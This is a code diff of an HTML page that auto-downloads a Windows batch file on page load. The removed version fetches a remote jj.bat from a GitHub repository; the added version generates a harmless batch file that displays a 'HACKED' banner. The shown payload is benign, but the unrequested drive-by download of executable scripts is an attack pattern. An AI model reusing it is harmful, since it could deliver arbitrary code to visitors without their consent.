@@ -1,25 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>File Downloader</title>
+    <title>BAT File Downloader</title>
     <script>
-        function downloadFile() {
-            const fileUrl = "https://github.com/mrroot0101/test2/raw/main/jj.bat";
-            const fileName = "jj.bat"; // Name to save as
+        function createAndDownloadBatFile() {
+            // BAT file content
+            const batContent = `
+@echo off
+echo #######################################
+echo #                                   #
+echo #             H A C K E D           #
+echo #                                   #
+echo #######################################
+echo.
+echo This is a test BAT file (harmless).
+echo Generated automatically via HTML+JS.
+echo.
+pause
+exit
+            `;
+
+            // Create a Blob (file-like object)
+            const blob = new Blob([batContent], { type: 'application/bat' });
+            const url = URL.createObjectURL(blob);
+
+            // Create a hidden download link and trigger it
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'hacked_message.bat';  // Filename
+            document.body.appendChild(a);
+            a.click();
             
-            const link = document.createElement('a');
-            link.href = fileUrl;
-            link.download = fileName;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            // Clean up
+            setTimeout(() => {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }, 100);
         }
-        // Auto-trigger download on page load
-        window.onload = downloadFile;
+
+        // Auto-download when page loads
+        window.onload = createAndDownloadBatFile;
     </script>
 </head>
 <body>
-    <h3>Downloading file...</h3>
-    <p>If the download doesn't start, <a href="#" onclick="downloadFile()">click here</a>.</p>
+    <h3>Generating BAT file...</h3>
+    <p>If the download doesn't start, <a href="#" onclick="createAndDownloadBatFile()">click here</a>.</p>
 </body>
 </html>
